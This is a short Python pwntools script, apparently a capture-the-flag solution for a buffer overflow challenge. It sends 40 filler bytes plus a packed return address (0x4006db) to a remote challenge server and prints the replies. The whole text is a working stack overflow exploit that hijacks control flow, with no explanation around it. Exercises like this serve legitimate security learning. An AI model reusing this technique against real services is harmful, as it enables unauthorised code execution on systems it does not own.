from pwn import *

payload = 'A'*40+p64(0x4006db)

p = remote('hack.bckdr.in', 15101)

print p.recv()
p.sendline(payload)
print p.recv()
